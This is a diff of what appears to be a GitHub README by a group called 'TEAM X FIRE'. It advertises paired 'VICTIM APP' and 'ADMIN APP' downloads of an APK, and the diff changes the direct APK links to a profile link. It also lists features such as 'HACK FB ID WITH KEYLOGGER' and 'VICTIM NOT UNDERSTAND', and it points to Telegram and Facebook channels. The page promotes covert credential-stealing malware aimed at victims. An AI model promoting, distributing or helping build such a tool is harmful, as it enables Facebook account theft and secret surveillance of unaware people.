@@ -8,7 +8,7 @@
  
   ## VICTIM APP
 
- <a href="https://github.com/teamxfire/CUSTOMSMSAPK/raw/main/TXF%20CUSTOM%20SMS%20PREMIUM%20V1.1.apk">DOWNLOAD NOW</a> 
+ <a href="https://github.com/teamxfire">DOWNLOAD NOW</a> 
 
  
  
@@ -17,65 +17,15 @@
 
   ## ADMIN APP 
 
- <a href="https://github.com/teamxfire/CUSTOMSMSAPK/raw/main/TXF%20CUSTOM%20SMS%20PREMIUM%20V1.1.apk">DOWNLOAD NOW</a> 
+ <a href="https://github.com/teamxfire">DOWNLOAD NOW</a> 
 
- 
-  
-
-  
-
-  
-
-
- 
- ## OUR TELEGRAM CHANNEL
 
  - [TEAM X FIRE](https://t.me/TXF2022) 
 
-
-  
-  
-
-  
-
- ## Developed By
-
-  
-
-  
-
- <a href="https://www.facebook.com/team.x.fire.official">TEAM X FIRE</a> 
-
-  
-
-  
-
- 
-
-  
-
-  
-
-  
+ <a href="https://www.facebook.com/team.x.fire.official">TEAM X FIRE SOCIAL </a> 
 
  Features:  
 
  - 1)  HACK FB ID WITH KEYLOGGER
-
  - 2) FULLY FREE 
  - 3) VICTIM NOT UNDERSTAND 
-
-
-  
-
-  
-
-  
-
-  
-
- 
-
-  
-
- 
